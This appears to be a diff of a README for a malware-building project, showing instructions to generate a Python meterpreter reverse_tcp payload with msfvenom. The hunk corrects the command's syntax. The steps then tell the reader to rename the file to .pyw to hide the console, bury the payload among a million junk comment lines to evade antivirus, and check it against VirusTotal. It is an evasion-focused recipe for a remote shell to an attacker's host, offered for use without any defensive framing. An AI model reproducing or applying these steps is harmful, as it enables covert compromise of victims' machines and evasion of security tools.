@@ -21,7 +21,7 @@ ________________________________________________________________________________
 - -------------------------------------------------------------------------------------
 ## [+] How to create and connect to the payload :
 - Use <strong><i>Msfvenom</strong></i> to create a Python payload.
-- In <strong><i>root</strong></i> user write this code : ```msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -o > Payload.py```.
+- In <strong><i>root</strong></i> user write this code : ```msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> > Payload.py```.
 - Change Output file from ```Payload.py``` to ```Payload.pyw``` --> To Hide the console.
 - Add a million lines in the file from this code ```#;lwqnbv4;o34vipn34[2qoiqqb54[noi2nb34o[gn3[2ioernvf[o34bgi32olnvcejkvn]]]]]``` Then put the python payload code in the middle of the million lines in the payload.
 - Save the file, now test it in VirusTotal and test it on your device to verify the file.
